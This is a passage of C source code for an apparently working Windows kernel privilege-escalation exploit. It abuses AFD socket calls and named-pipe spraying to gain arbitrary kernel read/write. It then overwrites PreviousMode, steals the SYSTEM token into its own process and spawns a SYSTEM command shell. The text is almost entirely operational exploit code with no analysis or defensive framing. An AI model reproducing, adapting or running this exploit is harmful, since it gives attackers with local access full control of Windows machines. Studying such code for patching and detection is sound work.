    m->crafted_irp->Tail.Overlay.CurrentStackLocation = m->crafted_arbitrary_io_stack_location;
    m->crafted_irp->Tail.Overlay.CurrentStackLocation->MajorFunction = 0xD;
    m->crafted_irp->Tail.Overlay.CurrentStackLocation->Parameters.Create.Options= FSCTL_PIPE_INTERNAL_WRITE;
    //__debugbreak();
    NtWriteFile(m->hFileRW, 0, 0, 0, &statusBlock, &b, 1, 0, 0);

    return 0;
}

BOOLEAN GetArbitraryReadWritePrimitive(mm* m) {

    m->pipe_100_im_control_block = GetPipeClientControlBlock(m, m->hPipeIM);
    m->pipe_100_rw_control_block = GetPipeClientControlBlock(m, m->hPipeRW);

    GetReadPrimitive(m);
    if (!GetWritePrimitive(m))
    {
        printf("[ERROR] No RW primitive");
    };
    return 0;
}

void CleaningIMPipe(mm *m) {
    PSIZE_T numOfBytesWritten = NULL;
    int const2 = 2;
    int const0 = 0;
    //__debugbreak();
    PVOID addrOfIM =(uint8_t*)m->pipe_100_im_control_block + 0xA0 + 0x18; // 0xA0 + 0x10
    NTSTATUS status = NtWriteVirtualMemory(GetCurrentProcess(), addrOfIM, &const2, 4, numOfBytesWritten);
    if (!NT_SUCCESS(status)) {
        printf("[ERROR] Unable to write value 2 to IM CBB.\n");
    }
    PVOID addrOfSecurityContextIM = (uint8_t*)m->pipe_100_im_control_block + 0x108;
    NTSTATUS status2 = NtWriteVirtualMemory(GetCurrentProcess(), addrOfSecurityContextIM, &const0, 8, numOfBytesWritten);
    if (!NT_SUCCESS(status2)) {
        printf("[ERROR] Unable to write value 0 to zero out SecurityContext in IM pipe.\n");
    }
    return;
}

void CleaningRWPipe(mm* m) {
    PSIZE_T numOfBytesWritten = NULL;
    int const1 = 1;
    //__debugbreak();
    PVOID addrOfRW = (uint8_t*)m->pipe_100_rw_control_block + 0x48 + 0x10;
    NTSTATUS status = NtWriteVirtualMemory(GetCurrentProcess(), addrOfRW, &const1, 4, numOfBytesWritten);
    if (!NT_SUCCESS(status)) {
        printf("[ERROR] Unable to write value 1 to RW CBB.\n");
    }
    return;
}

BOOL GetSystemCMD() {
    STARTUPINFOA StartupInfo;
    PROCESS_INFORMATION ProcessInformation;

    ZeroMemory(&StartupInfo, sizeof(StartupInfo));
    ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

    StartupInfo.cb = sizeof(StartupInfo);

    if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcessInformation)) {
        printf("[-] Couldn't create cmd.exe process!\n");
        return FALSE;
    }
    else {
        printf("[*] Calling CMD System\n");
    }
    //WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);

    return TRUE;
}

DWORD GetPsInitialSystemProcessOffset() 
{
    HMODULE ntoskrnl = NULL;
    DWORD dwPsInitialSystemProcessOffset = 0;
    ULONG_PTR pPsInitialSystemProcess = 0;

    // value of ntoskrnl is the base address of the mapped ntoskrnl.exe in our process memory
    ntoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (ntoskrnl == NULL) {
        printf("[-] Couldn't load ntoskrnl.exe\n");
        return 0;
    }

    pPsInitialSystemProcess = (ULONG_PTR)GetProcAddress(ntoskrnl, "PsInitialSystemProcess");
    if (pPsInitialSystemProcess) {
        // substracting from the address of the symbol the base address gives us the offset
        dwPsInitialSystemProcessOffset = (DWORD)(pPsInitialSystemProcess - (ULONG_PTR)(ntoskrnl));
        FreeLibrary(ntoskrnl);
        return dwPsInitialSystemProcessOffset;
    }

    printf("[-] Couldn't GetProcAddress of PsInitialSystemProcess\n");
    return 0;
}

ULONG_PTR GetKernelAddress(ULONG_PTR KernelBase, DWORD Offset) {
    return KernelBase + Offset;
}

ULONG_PTR GetEprocessOfCurrentProcess(ULONG_PTR addrOfSystem) {
    ULONG_PTR addrOfEPCurrentProcess=0;
    PSIZE_T bytesWrriten = NULL;
    ULONG_PTR nextActiveProcList = 0;
    _LIST_ENTRY* active_eprocess_links =  (_LIST_ENTRY*)((BYTE*)addrOfSystem + OFFSET_TO_ACTIVE_PROCESS_LINKS);

    printf("[*] Address of Active process link in _EPROCESS: %llx\n", active_eprocess_links);

    DWORD currprocID = GetCurrentProcessId();
    DWORD procID = 0;
    //__debugbreak();
    do
    {


        NtReadVirtualMemory(GetCurrentProcess(), active_eprocess_links, &nextActiveProcList, 8, bytesWrriten);
        NtReadVirtualMemory(GetCurrentProcess(), (BYTE*)nextActiveProcList - 8, &procID, 4, bytesWrriten);
        //procID = *((BYTE*)nextActiveProcList - 8);
        active_eprocess_links =(_LIST_ENTRY*) nextActiveProcList;
        //printf("Process ID: %d", procID);
        addrOfEPCurrentProcess = nextActiveProcList;
    } while (currprocID != procID);



    return addrOfEPCurrentProcess - OFFSET_TO_ACTIVE_PROCESS_LINKS;
}

int TokenStealing()
{
    PSIZE_T bytesWriten = 0;
    PSIZE_T bytesWriten2 = 0;
    ULONG_PTR addrOfSystemEPROCESS = 0;
    ULONG_PTR SystemTOKEN = 0;
    ULONG_PTR CurrentProcessToken = 0;
    PVOID KernelBaseAddress = FindSysBase("ntoskrnl.exe");
    if (KernelBaseAddress) 
    {
        printf("[*] Kernel base address:%llx\n", KernelBaseAddress);
    }
    else {
        printf("[-] Cannot get address of NtOskrnl.exe\n");
        return 1;
    }
    
    DWORD SystemAddressOffset = GetPsInitialSystemProcessOffset(); // find out the offset to the global variable PsInitialSystemProcess
    if (!SystemAddressOffset) 
    {
        printf("[-] Couldn't get global variable of PsInitialSystemProcess\n");
        return 1;
    }
    PVOID ptrEprocessSystem = (PVOID)GetKernelAddress((ULONG_PTR)KernelBaseAddress, SystemAddressOffset);
    printf("[*] Address of PsInitialSystemProcess: %llx\n", ptrEprocessSystem);

    if (!NT_SUCCESS(NtReadVirtualMemory(GetCurrentProcess(), ptrEprocessSystem, &addrOfSystemEPROCESS, 8, bytesWriten)))
    {
        printf("[-] Error in NtReadVirtualMemory address of PsInitialSystemProcess\n");
        return 1;
    }
    printf("[*] Address of System _EPROCESS: %llx\n", addrOfSystemEPROCESS);
    ULONG_PTR currentEPROCESS = GetEprocessOfCurrentProcess(addrOfSystemEPROCESS);
    printf("[*] Address of EPROCESS of current process: %llx\n", currentEPROCESS);
    if (!NT_SUCCESS(NtReadVirtualMemory(GetCurrentProcess(), (BYTE*)addrOfSystemEPROCESS + OFFSET_TO_TOKEN, &SystemTOKEN, 8, bytesWriten)))
    {
        printf("[-] Error in NtReadVirtualMemory read Token from System _EPROCESS\n");
        return 1;
    }
    
    if (!NT_SUCCESS(NtReadVirtualMemory(GetCurrentProcess(), (BYTE*)currentEPROCESS + OFFSET_TO_TOKEN, &CurrentProcessToken, 8, bytesWriten)))
    {
        printf("[-] Error in NtReadVirtualMemory read Token from current _EPROCESS\n");
        return 1;
    }
    SystemTOKEN = SystemTOKEN & ~15;
    CurrentProcessToken = CurrentProcessToken & 15;
    ULONG_PTR  NewToken = SystemTOKEN | CurrentProcessToken;
    printf("[*] System TOKEN: %llx\n", SystemTOKEN);
    printf("[*] New TOKEN: %llx\n", NewToken);
    //__debugbreak();
    if (!NT_SUCCESS(NtWriteVirtualMemory(GetCurrentProcess(), (BYTE*)currentEPROCESS + OFFSET_TO_TOKEN, &NewToken, 8, bytesWriten2))) 
    {
        printf("[-] Error in NtWriteVirtualMemory write NewToken to current _EPROCESS\n");
        return 1;
    }

    PVOID currentKTHREAD = FindCurrentKTHREAD();
    if (!currentKTHREAD) 
    {
        printf("[-] Couldn't get KTHREAD address of current process\n");
        return 1;
    }
    uint8_t b = 1;
    PVOID addrToWrite = (uint8_t*)currentKTHREAD + PREVIOUS_MODE_OFFSET;
    
    if (!NT_SUCCESS(NtWriteVirtualMemory(GetCurrentProcess(), addrToWrite, &b, 1, NULL))) 
    {
        printf("[-] Error in NtWriteVirtualMemory restore PreviousMode in current _KTHREAD\n");
        return 1;
    }


    return  0;
}
int main()
{
    // check if executing on a supported OS version
    uint32_t major_version = *(uint32_t*)(0x7FFE026C);
    uint32_t minor_version = *(uint32_t*)(0x7FFE0270);
    uint32_t build_number = *(uint32_t*)(0x7FFE0260);

    uint32_t currentProcessID = GetCurrentProcessId();
    IO_STATUS_BLOCK statusblock;
    void* output = LocalAlloc(LMEM_ZEROINIT, 0x780000);
    //Main struct
    mm m = { 0 };

    BOOL wow64;
    BOOL wow64_return = IsWow64Process(GetCurrentProcess(), &wow64);
    if (major_version != 10 || minor_version != 0 || build_number < 15063 || !wow64_return || wow64) {
        printf("[ERROR] Unsupported Windows build.\n");
        ExitProcess(1);
    }


    //Creating PIPEs
    const wchar_t *pipe_im = L"\\\\.\\pipe\\LOCAL\\im";
    const wchar_t *pipe_rw= L"\\\\.\\pipe\\LOCAL\\rw";
    HANDLE hPipe_im = CreateNamedPipeW(pipe_im, PIPE_ACCESS_DUPLEX, 0, 0xFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFu, 0LL);
    if (!NT_SUCCESS(hPipe_im)){
    
        printf("[ERROR] code:%d Creating hPipe_im.\n", GetLastError());
        ExitProcess(1);
    }
    else
    {
        printf("[*] Created pipe IM: 0x%x -> 0x%llx\n", hPipe_im,GetKernelAddr(hPipe_im));
    }

    HANDLE hPipe_rw = CreateNamedPipeW(pipe_rw, PIPE_ACCESS_DUPLEX, 0, 0xFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFu, 0LL);
    if (!NT_SUCCESS(hPipe_rw))
    {

        printf("[ERROR] Creating pipe_rw.\n");
        ExitProcess(1);
    }
    else
    {
        printf("[*] Created pipe RW: 0x%x -> 0x%llx\n", hPipe_rw, GetKernelAddr(hPipe_rw));
    }

    HANDLE hFile_im = CreateFileW(pipe_im, 0xC0000000, 3u, 0LL, OPEN_EXISTING, 0, 0LL);
    HANDLE hFile_rw = CreateFileW(pipe_rw, 0xC0000000, 3u, 0LL, OPEN_EXISTING, 0, 0LL);

    if (!hFile_im || hFile_im == (HANDLE)-1) {
        printf("[ERROR] Opening hPipe_im.\n");
        ExitProcess(1);
    }
    else 
    {
        printf("[*] Open file handle for IM pipe: 0x%x -> 0x%llx\n", hFile_im,GetKernelAddr(hFile_im));
    }

    if (!hFile_rw || hFile_rw == (HANDLE)-1) {
        printf("[ERROR] Opening hFile_rw.\n");
        ExitProcess(1);
    }
    else 
    {
        printf("[*] Open file handle for RW pipe: 0x%x->0x%llx\n", hFile_rw, GetKernelAddr(hFile_rw));
    }
    
    printf("[*] Creating evil output and input structs\n");
    CreateEvilStructs(&m);
    m.hFileIM = hFile_im;
    m.hFileRW= hFile_rw;
    m.hPipeIM = hPipe_im;
    m.hPipeRW = hPipe_rw;

    HANDLE hNtSock1;
    HANDLE hNtSock2;

    NTSTATUS afdcreatestatus = AfdCreate(&hNtSock1, 0x11000);
    if(!NT_SUCCESS(afdcreatestatus))
    {

        printf("[ERROR nt code:%x] Creating NT Socket\n", afdcreatestatus);
        ExitProcess(1);
    }else
    {
        printf("[*] Creating NT Windows Socket1: 0x%x -> 0x%llx\n", hNtSock1, GetKernelAddr(hNtSock1));
    }

    NTSTATUS afdBindStatus = AfdBind(&m, hNtSock1);
    if (!NT_SUCCESS(afdBindStatus))
    {
        printf("[ERROR nt code:%x] AfdBind\n", afdBindStatus);
        ExitProcess(1);
    }
    else {
        printf("[*] Binding to NT Windows Socket1\n");
    }

    afdcreatestatus = AfdCreate(&hNtSock2, 0x10000);
    if (!NT_SUCCESS(afdcreatestatus))
    {
        printf("[ERROR nt code:%x] Creating NT Socket2\n", afdcreatestatus);
        ExitProcess(1);
    }
    else
    {
        printf("[*] Creating NT Windows Socket2: 0x%x -> 0x%llx\n", GetKernelAddr(hNtSock2));
    }

    NTSTATUS afdConnectStatus = AfdConnect(&m, hNtSock2, hNtSock1);
    if (!NT_SUCCESS(afdConnectStatus))
    {

        printf("[ERROR nt code:%x] AfdConnect\n", afdConnectStatus);
        ExitProcess(1);
    }
    else
    {
        printf("[*] Connecting to the NT Windows Socket2\n");
    }


    NTSTATUS afdListenStatus = AfdListen(hNtSock2);
    if (!NT_SUCCESS(afdListenStatus))
    {
        printf("[ERROR nt code:%x] AfdConnect\n");
        ExitProcess(1);
    }
    else
    {
        printf("[*] Listening to NT Windows Socket2\n");
    }

    //__debugbreak();

    NTSTATUS ntclosestatus = NtClose(hNtSock2);
    if (!NT_SUCCESS(ntclosestatus))
    {
        printf("[ERROR nt code:%x] Colsing NT Windows socket2\n");
        ExitProcess(1);
    }
    else
    {
        printf("[*] Listening to NT Windows Socket2\n");
    }

    NTSTATUS writingStatus = WritingToIM_pipe(&m);
    if (!NT_SUCCESS(writingStatus))
    {
        printf("[ERROR nt code:%x] In writing to IM Pipe\n", writingStatus);
        ExitProcess(1);
    }
    else {
        printf("[*] Wrinting output to the IM Pipe, [Pipe spraying?]\n");
    }

   

    NTSTATUS AfdGetSockNameStatus= AfdGetSockName(hNtSock1,&m);
    if (!NT_SUCCESS(AfdGetSockNameStatus))
    {
        printf("[ERROR nt code:%x] To get socket name\n", AfdGetSockNameStatus);
        ExitProcess(1);
    }
    else {
        printf("[*] Get the sock name from NT windows sock1\n");
    }
    
    if (GetIncPrimitive(&m)) {
        printf("[ERROR] Could not achieve Increment Primitives\n");
        ExitProcess(1);
    }
    else {
        printf("[*] Obtained Increment Primitives\n");
    }

    GetArbitraryReadWritePrimitive(&m);

    CrashPreviousMode(&m);

    CleaningIMPipe(&m);
    CleaningRWPipe(&m);
    NtClose(m.IncPrimitiveTOKEN);
    NtClose(m.RWPrimitiveTOKEN);

    if (TokenStealing())
    {
        printf("[-] ERROR in process token stealing\n");
    }
    
    GetSystemCMD();


    return 0;
}